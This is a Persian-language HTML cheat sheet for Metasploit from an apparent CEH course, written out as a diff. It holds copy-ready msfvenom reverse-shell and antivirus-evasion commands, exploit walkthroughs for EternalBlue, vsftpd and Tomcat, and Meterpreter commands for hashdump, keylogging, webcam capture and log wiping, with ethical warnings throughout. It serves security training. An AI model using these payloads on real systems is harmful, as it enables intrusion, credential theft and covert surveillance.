@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چیت‌شیت Metasploit - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            font-size: 0.95rem;
+            min-width: 550px;
+        }
+        th {
+            background: #1e3a5f;
+            color: white;
+            padding: 12px 15px;
+            text-align: right;
+            white-space: nowrap;
+            font-weight: 600;
+        }
+        td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #e8edf4;
+            vertical-align: top;
+        }
+        tr:hover {
+            background: #f1f6fa;
+        }
+        td code, th code {
+            background: #eef3f7;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #c7254e;
+            border: 1px solid #dce3ea;
+            white-space: nowrap;
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .module-section {
+            margin: 25px 0 15px 0;
+            border-right: 4px solid #2a7de1;
+            padding-right: 15px;
+        }
+        .module-section h3 {
+            color: #0b3b5c;
+            border-bottom: 2px solid #b6d4f0;
+            padding-bottom: 5px;
+            margin-top: 0;
+        }
+        @media (max-width: 768px) {
+            table {
+                font-size: 0.85rem;
+                min-width: 400px;
+            }
+            th, td {
+                padding: 8px 10px;
+            }
+        }
+        @media (max-width: 480px) {
+            table {
+                font-size: 0.8rem;
+                min-width: 320px;
+            }
+            th, td {
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">ابزارها</a>
+        </span>
+    </div>
+
+    <h1>⚡ چیت‌شیت جامع Metasploit</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 مقدمه – Metasploit چیست؟</h2>
+        <p>
+            <b>Metasploit Framework</b> یکی از قدرتمندترین و محبوب‌ترین چارچوب‌های تست نفوذ در جهان است که توسط <b>Rapid7</b> توسعه داده شده است. این ابزار به متخصصان امنیت امکان می‌دهد تا آسیب‌پذیری‌ها را شناسایی، بهره‌برداری (Exploit) کرده و پس از نفوذ، عملیات‌های مختلفی را روی سیستم هدف انجام دهند.
+        </p>
+        <p>
+            Metasploit شامل مجموعه‌ای از <b>ماژول‌ها (Modules)</b> است که هر کدام برای یک کار خاص طراحی شده‌اند. این ماژول‌ها به هکر قانونمند اجازه می‌دهند تا حملات هدفمند و پیچیده‌ای را با حداقل کدنویسی انجام دهد.
+        </p>
+        <div class="info-box">
+            <b>💡 کاربردهای اصلی Metasploit:</b>
+            <ul>
+                <li><b>بهره‌برداری (Exploitation):</b> اجرای کدهای Exploit برای نفوذ به سیستم‌های آسیب‌پذیر.</li>
+                <li><b>تولید Payload:</b> ایجاد بدافزار و کدهای مخرب برای دسترسی به سیستم هدف.</li>
+                <li><b>اسکن و شناسایی:</b> کشف آسیب‌پذیری‌ها و جمع‌آوری اطلاعات از سیستم‌های هدف.</li>
+                <li><b>مدیریت پس از نفوذ (Post-Exploitation):</b> پس از دسترسی به سیستم، انجام عملیات‌های مختلف مانند استخراج داده، افزایش دسترسی و …</li>
+                <li><b>آموزش و شبیه‌سازی:</b> شبیه‌سازی حملات برای آموزش و ارزیابی امنیت.</li>
+            </ul>
+        </div>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> Metasploit یک ابزار بسیار قدرتمند است. استفاده از آن برای حمله به سیستم‌های بدون مجوز، <b>جرم</b> محسوب می‌شود. فقط در محیط‌های آزمایشگاهی و با مجوز استفاده شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: نصب و راه‌اندازی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📥 نصب و راه‌اندازی Metasploit</h2>
+
+        <h3>📌 نصب در Kali Linux (پیش‌فرض):</h3>
+        <p>Metasploit در Kali Linux به صورت پیش‌فرض نصب است. برای اطمینان از آخرین نسخه:</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sudo apt update
+sudo apt install metasploit-framework -y</code></pre>
+        </div>
+
+        <h3>📌 راه‌اندازی کنسول Metasploit:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>msfconsole</code></pre>
+        </div>
+
+        <h3>📌 به‌روزرسانی پایگاه داده:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>msfupdate</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> پس از ورود به <code dir='ltr'>msfconsole</code>، محیط تعاملی Metasploit نمایش داده می‌شود که با <code dir='ltr'>help</code> می‌توانید لیست دستورات را مشاهده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: ساختار Metasploit -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🏗️ ساختار Metasploit و انواع ماژول‌ها</h2>
+
+        <p>Metasploit شامل انواع مختلفی از ماژول‌ها است که هر کدام کاربرد خاصی دارند:</p>
+
+        <div class="module-section">
+            <h3>🎯 ۱. Exploit – ماژول‌های بهره‌برداری</h3>
+            <p>این ماژول‌ها برای بهره‌برداری از آسیب‌پذیری‌های خاص طراحی شده‌اند.</p>
+            <ul>
+                <li><b>مثال:</b> <code dir='ltr'>exploit/windows/smb/ms17_010_eternalblue</code> (EternalBlue برای ویندوز)</li>
+                <li><b>مثال:</b> <code dir='ltr'>exploit/unix/ftp/vsftpd_234_backdoor</code> (آسیب‌پذیری vsftpd)</li>
+            </ul>
+        </div>
+
+        <div class="module-section">
+            <h3>📦 ۲. Payload – کدهای اجرایی پس از نفوذ</h3>
+            <p>Payloadها کدهایی هستند که پس از موفقیت Exploit روی سیستم هدف اجرا می‌شوند.</p>
+            <ul>
+                <li><b>مثال:</b> <code dir='ltr'>windows/meterpreter/reverse_tcp</code> (Meterpreter با اتصال معکوس)</li>
+                <li><b>مثال:</b> <code dir='ltr'>linux/x64/shell_reverse_tcp</code> (شل معکوس لینوکس)</li>
+            </ul>
+        </div>
+
+        <div class="module-section">
+            <h3>🔍 ۳. Auxiliary – ماژول‌های کمکی</h3>
+            <p>این ماژول‌ها برای اسکن، کشف، و جمع‌آوری اطلاعات استفاده می‌شوند.</p>
+            <ul>
+                <li><b>مثال:</b> <code dir='ltr'>auxiliary/scanner/portscan/tcp</code> (اسکن پورت TCP)</li>
+                <li><b>مثال:</b> <code dir='ltr'>auxiliary/scanner/smb/smb_version</code> (شناسایی نسخه SMB)</li>
+            </ul>
+        </div>
+
+        <div class="module-section">
+            <h3>🛠️ ۴. Post – ماژول‌های پس از نفوذ</h3>
+            <p>ماژول‌هایی که پس از دسترسی به سیستم برای انجام عملیات‌های مختلف استفاده می‌شوند.</p>
+            <ul>
+                <li><b>مثال:</b> <code dir='ltr'>post/windows/gather/enum_users</code> (شمارش کاربران ویندوز)</li>
+                <li><b>مثال:</b> <code dir='ltr'>post/linux/gather/enum_configs</code> (جمع‌آوری تنظیمات لینوکس)</li>
+            </ul>
+        </div>
+
+        <div class="module-section">
+            <h3>🔧 ۵. Encoder – رمزنگاری Payload</h3>
+            <p>برای دور زدن آنتی‌ویروس‌ها و سیستم‌های تشخیص نفوذ استفاده می‌شوند.</p>
+            <ul>
+                <li><b>مثال:</b> <code dir='ltr'>x86/shikata_ga_nai</code> (معروف‌ترین encoder)</li>
+            </ul>
+        </div>
+
+        <div class="module-section">
+            <h3>🧩 ۶. NOP – NOP Sled</h3>
+            <p>برای پر کردن فضای خالی در بهره‌برداری‌های سرریز بافر استفاده می‌شوند.</p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: دستورات پایه در msfconsole -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>⌨️ دستورات پایه در msfconsole</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>دستور</th><th>توضیح</th><th>مثال</th></tr>
+                <tr>
+                    <td><code dir='ltr'>help</code> یا <code dir='ltr'>?</code></td>
+                    <td>نمایش لیست دستورات</td>
+                    <td><code dir='ltr'>help</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>use</code></td>
+                    <td>انتخاب یک ماژول</td>
+                    <td><code dir='ltr'>use exploit/windows/smb/ms17_010_eternalblue</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>show</code></td>
+                    <td>نمایش اطلاعات ماژول</td>
+                    <td><code dir='ltr'>show options</code>، <code dir='ltr'>show payloads</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>set</code></td>
+                    <td>تنظیم یک گزینه</td>
+                    <td><code dir='ltr'>set RHOST 192.168.1.101</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>unset</code></td>
+                    <td>حذف تنظیم یک گزینه</td>
+                    <td><code dir='ltr'>unset RHOST</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>setg</code></td>
+                    <td>تنظیم یک گزینه به صورت سراسری</td>
+                    <td><code dir='ltr'>setg RHOST 192.168.1.101</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>run</code> یا <code dir='ltr'>exploit</code></td>
+                    <td>اجرای ماژول انتخاب‌شده</td>
+                    <td><code dir='ltr'>run</code> یا <code dir='ltr'>exploit</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>check</code></td>
+                    <td>بررسی آسیب‌پذیری (بدون بهره‌برداری)</td>
+                    <td><code dir='ltr'>check</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>back</code></td>
+                    <td>خروج از ماژول فعلی</td>
+                    <td><code dir='ltr'>back</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>search</code></td>
+                    <td>جستجوی ماژول‌ها</td>
+                    <td><code dir='ltr'>search smb</code>، <code dir='ltr'>search eternalblue</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>info</code></td>
+                    <td>نمایش اطلاعات کامل یک ماژول</td>
+                    <td><code dir='ltr'>info exploit/windows/smb/ms17_010_eternalblue</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>sessions</code></td>
+                    <td>مدیریت جلسات فعال</td>
+                    <td><code dir='ltr'>sessions -l</code>، <code dir='ltr'>sessions -i 1</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>jobs</code></td>
+                    <td>مدیریت کارهای پس‌زمینه</td>
+                    <td><code dir='ltr'>jobs -l</code>، <code dir='ltr'>jobs -k 1</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>exit</code></td>
+                    <td>خروج از msfconsole</td>
+                    <td><code dir='ltr'>exit</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>clear</code></td>
+                    <td>پاک کردن صفحه</td>
+                    <td><code dir='ltr'>clear</code></td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> در Metasploit، گزینه‌های رایج شامل <code dir='ltr'>RHOST</code> (آدرس هدف)، <code dir='ltr'>RPORT</code> (پورت هدف)، <code dir='ltr'>LHOST</code> (آدرس سیستم مهاجم) و <code dir='ltr'>LPORT</code> (پورت سیستم مهاجم) هستند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: کار با Payloadها -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📦 کار با Payloadها و msfvenom</h2>
+
+        <h3>📌 ۱. msfvenom – تولید Payload</h3>
+        <p><b>msfvenom</b> ابزاری برای تولید Payloadهای سفارشی است که جایگزین <code dir='ltr'>msfpayload</code> و <code dir='ltr'>msfencode</code> شده است.</p>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># نمایش لیست payloadها
+msfvenom -l payloads
+
+# نمایش لیست encoderها
+msfvenom -l encoders
+
+# تولید یک شل معکوس برای لینوکس
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
+
+# تولید یک Meterpreter برای ویندوز
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+# تولید یک Web Shell (PHP)
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
+
+# با Encoder برای فرار از آنتی‌ویروس
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe</code></pre>
+        </div>
+
+        <h3>📌 ۲. تنظیم Payload در msfconsole</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># بعد از انتخاب یک exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# مشاهده payloadهای موجود
+show payloads
+
+# انتخاب payload
+set payload windows/meterpreter/reverse_tcp
+
+# تنظیم گزینه‌ها
+set LHOST 192.168.1.100
+set LPORT 4444
+set RHOST 192.168.1.101
+
+# اجرای حمله
+exploit</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> Payloadهای تولیدشده با msfvenom توسط بسیاری از آنتی‌ویروس‌ها شناسایی می‌شوند. از Encoderها برای کاهش احتمال شناسایی استفاده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: سناریوهای عملی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🧪 سناریوهای عملی با Metasploit</h2>
+
+        <h3>📌 سناریو ۱: حمله به vsftpd (Metasploitable 2)</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.1.101
+set RPORT 21
+exploit</code></pre>
+        </div>
+        <p><b>توضیح:</b> این Exploit از آسیب‌پذیری پشتی (Backdoor) در نسخه vsftpd 2.3.4 استفاده می‌کند و یک شل مستقیم روی پورت ۶۲۰۰ باز می‌کند.</p>
+
+        <h3>📌 سناریو ۲: حمله EternalBlue (MS17-010) به ویندوز</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.101
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit</code></pre>
+        </div>
+        <p><b>توضیح:</b> EternalBlue یکی از معروف‌ترین Exploitها است که از آسیب‌پذیری SMB در ویندوز استفاده می‌کند و به هکر اجازه می‌دهد به سیستم نفوذ کند.</p>
+
+        <h3>📌 سناریو ۳: حمله به Tomcat (Apache Tomcat)</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>msfconsole
+use exploit/multi/http/tomcat_mgr_deploy
+set RHOST 192.168.1.101
+set RPORT 8080
+set USERNAME tomcat
+set PASSWORD tomcat
+set PAYLOAD java/jsp_shell_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۴: تولید و اجرای یک شل معکوس با msfvenom</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># تولید Payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+# راه‌اندازی Listener در Metasploit
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+# اجرای shell.exe روی سیستم هدف (با هر روشی مانند ایمیل یا USB)</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۵: اسکن شبکه با ماژول‌های Auxiliary</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># اسکن پورت TCP
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 22,80,443
+run
+
+# اسکن SMB Version
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.101
+run
+
+# اسکن SSH
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.1.101
+run</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۶: پس از نفوذ – جمع‌آوری اطلاعات</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># پس از دسترسی به سیستم (Meterpreter)
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getpid
+meterpreter > ps
+meterpreter > download /etc/passwd
+meterpreter > upload /root/backdoor.exe C:\Windows\Temp\
+meterpreter > shell  # شل سیستمی</code></pre>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: دستورات Meterpreter -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🖥️ دستورات پرکاربرد Meterpreter</h2>
+        <p>Meterpreter یک شل پیشرفته است که پس از نفوذ به سیستم در اختیار هکر قرار می‌گیرد.</p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>دستور</th><th>توضیح</th><th>مثال</th></tr>
+                <tr><td><code dir='ltr'>sysinfo</code></td><td>نمایش اطلاعات سیستم</td><td><code dir='ltr'>sysinfo</code></td></tr>
+                <tr><td><code dir='ltr'>getuid</code></td><td>نمایش نام کاربر جاری</td><td><code dir='ltr'>getuid</code></td></tr>
+                <tr><td><code dir='ltr'>getpid</code></td><td>نمایش PID فرآیند جاری</td><td><code dir='ltr'>getpid</code></td></tr>
+                <tr><td><code dir='ltr'>ps</code></td><td>نمایش لیست فرآیندها</td><td><code dir='ltr'>ps</code></td></tr>
+                <tr><td><code dir='ltr'>migrate</code></td><td>انتقال به یک فرآیند دیگر</td><td><code dir='ltr'>migrate 1234</code></td></tr>
+                <tr><td><code dir='ltr'>download</code></td><td>دانلود فایل از هدف</td><td><code dir='ltr'>download /etc/passwd</code></td></tr>
+                <tr><td><code dir='ltr'>upload</code></td><td>آپلود فایل به هدف</td><td><code dir='ltr'>upload shell.exe C:\Windows\Temp\</code></td></tr>
+                <tr><td><code dir='ltr'>shell</code></td><td>دریافت شل سیستمی (cmd/bash)</td><td><code dir='ltr'>shell</code></td></tr>
+                <tr><td><code dir='ltr'>exit</code></td><td>خروج از Meterpreter</td><td><code dir='ltr'>exit</code></td></tr>
+                <tr><td><code dir='ltr'>help</code></td><td>نمایش راهنما</td><td><code dir='ltr'>help</code></td></tr>
+                <tr><td><code dir='ltr'>clearev</code></td><td>پاک کردن لاگ‌های رویداد</td><td><code dir='ltr'>clearev</code></td></tr>
+                <tr><td><code dir='ltr'>hashdump</code></td><td>استخراج هش‌های پسورد (ویندوز)</td><td><code dir='ltr'>hashdump</code></td></tr>
+                <tr><td><code dir='ltr'>screenshot</code></td><td>گرفتن عکس از صفحه نمایش</td><td><code dir='ltr'>screenshot</code></td></tr>
+                <tr><td><code dir='ltr'>webcam_snap</code></td><td>گرفتن عکس از وب‌کم</td><td><code dir='ltr'>webcam_snap</code></td></tr>
+                <tr><td><code dir='ltr'>keyscan_start</code></td><td>شروع ضبط کی‌لاگر</td><td><code dir='ltr'>keyscan_start</code></td></tr>
+                <tr><td><code dir='ltr'>keyscan_dump</code></td><td>نمایش ضبط‌شده کی‌لاگر</td><td><code dir='ltr'>keyscan_dump</code></td></tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: جستجو و مدیریت ماژول‌ها -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔍 جستجو و مدیریت ماژول‌ها</h2>
+
+        <h3>📌 جستجوی ماژول‌ها:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># جستجو با کلمه کلیدی
+search smb
+search eternalblue
+search apache
+search windows
+
+# جستجو با نوع ماژول
+search type:exploit
+search type:auxiliary
+
+# جستجو با امتیاز CVSS
+search cve:2017</code></pre>
+        </div>
+
+        <h3>📌 اطلاعات ماژول:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># نمایش اطلاعات کامل
+info exploit/windows/smb/ms17_010_eternalblue
+
+# نمایش گزینه‌ها
+show options
+
+# نمایش payloadهای موجود
+show payloads
+
+# نمایش اهداف (Targets)
+show targets</code></pre>
+        </div>
+
+        <h3>📌 مسیرهای مهم ماژول‌ها:</h3>
+        <ul>
+            <li><b>Exploit:</b> <code dir='ltr'>/usr/share/metasploit-framework/modules/exploits/</code></li>
+            <li><b>Payload:</b> <code dir='ltr'>/usr/share/metasploit-framework/modules/payloads/</code></li>
+            <li><b>Auxiliary:</b> <code dir='ltr'>/usr/share/metasploit-framework/modules/auxiliary/</code></li>
+            <li><b>Post:</b> <code dir='ltr'>/usr/share/metasploit-framework/modules/post/</code></li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> با دستور <code dir='ltr'>search</code> می‌توانید به سرعت ماژول‌های مورد نظر را پیدا کنید. استفاده از کلمات کلیدی دقیق، نتایج بهتری به همراه دارد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: نکات امنیتی و حرفه‌ای -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔒 نکات امنیتی و حرفه‌ای</h2>
+
+        <ul>
+            <li><b>همیشه از محیط‌های مجازی استفاده کنید:</b> هرگز Metasploit را روی سیستم‌های واقعی و بدون مجوز تست نکنید.</li>
+            <li><b>از Payloadهای مناسب استفاده کنید:</b> انتخاب Payload مناسب (مثل Meterpreter vs Shell) به هدف حمله بستگی دارد.</li>
+            <li><b>تنظیم LHOST و LPORT به درستی:</b> این گزینه‌ها باید آدرس و پورت سیستم مهاجم را مشخص کنند تا ارتباط برقرار شود.</li>
+            <li><b>استفاده از Encoder:</b> برای کاهش احتمال شناسایی توسط آنتی‌ویروس‌ها، از Encoderهایی مانند <code dir='ltr'>x86/shikata_ga_nai</code> استفاده کنید.</li>
+            <li><b>پاک کردن ردپا:</b> پس از اتمام تست، با دستور <code dir='ltr'>clearev</code> لاگ‌ها را پاک کنید (در محیط‌های مجاز).</li>
+            <li><b>مطالعه مستندات:</b> هر ماژول اطلاعات کاملی در <code dir='ltr'>info</code> دارد که قبل از استفاده حتماً مطالعه کنید.</li>
+            <li><b>آزمایش در محیط‌های کنترل‌شده:</b> از محیط‌هایی مانند Metasploitable، DVWA و HackTheBox برای تمرین استفاده کنید.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> Metasploit یک ابزار دو لبه است. استفاده نادرست از آن می‌تواند عواقب قانونی جدی داشته باشد. همیشه با مجوز و در چارچوب قوانین کار کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📖 واژه‌نامه تخصصی Metasploit</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th style="min-width:130px;">واژه</th><th>توضیح کامل</th></tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Exploit</span></td>
+                    <td>کد یا تکنیکی که از یک آسیب‌پذیری برای نفوذ به سیستم استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Payload</span></td>
+                    <td>کدی که پس از موفقیت Exploit روی سیستم هدف اجرا می‌شود (مثل شل، Meterpreter).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Meterpreter</span></td>
+                    <td>یک شل پیشرفته در Metasploit که امکانات زیادی مانند کی‌لاگر، دانلود/آپلود فایل و … را ارائه می‌دهد.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Auxiliary</span></td>
+                    <td>ماژول‌های کمکی برای اسکن، کشف و جمع‌آوری اطلاعات.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Post</span></td>
+                    <td>ماژول‌هایی که پس از نفوذ برای انجام عملیات‌های مختلف استفاده می‌شوند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Encoder</span></td>
+                    <td>ابزاری برای رمزنگاری Payload و دور زدن آنتی‌ویروس‌ها.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">NOP Sled</span></td>
+                    <td>رشته‌ای از دستورات NOP که برای پر کردن فضای خالی در حملات سرریز بافر استفاده می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Handler</span></td>
+                    <td>ماژولی که برای دریافت اتصالات ورودی از Payloadها استفاده می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">msfvenom</span></td>
+                    <td>ابزار تولید Payload در Metasploit (جایگزین msfpayload و msfencode).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">msfconsole</span></td>
+                    <td>واسط خط فرمان اصلی Metasploit.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">RHOST</span></td>
+                    <td>آدرس IP یا نام دامنه سیستم هدف.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">RPORT</span></td>
+                    <td>پورت سیستم هدف.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">LHOST</span></td>
+                    <td>آدرس IP سیستم مهاجم (برای اتصال معکوس).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">LPORT</span></td>
+                    <td>پورت سیستم مهاجم (برای اتصال معکوس).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">EternalBlue</span></td>
+                    <td>یکی از معروف‌ترین Exploitها که از آسیب‌پذیری SMB در ویندوز استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Session</span></td>
+                    <td>یک جلسه فعال بین مهاجم و سیستم هدف پس از موفقیت Exploit.</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی چیت‌شیت Metasploit:</b>
+        <p>
+            Metasploit یکی از قدرتمندترین ابزارهای تست نفوذ است که با ترکیب Exploit، Payload و ماژول‌های مختلف، 
+            به متخصصان امنیت امکان شبیه‌سازی حملات واقعی را می‌دهد. تسلط بر Metasploit برای هر هکر قانونمند ضروری است.
+        </p>
+        <p>
+            <b>📌 توصیه نهایی:</b> با ماژول‌های ساده شروع کنید (مثل vsftpd) و سپس به سراغ حملات پیچیده‌تر بروید. 
+            همیشه در محیط‌های آزمایشگاهی تمرین کنید و مستندات هر ماژول را قبل از استفاده مطالعه کنید.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
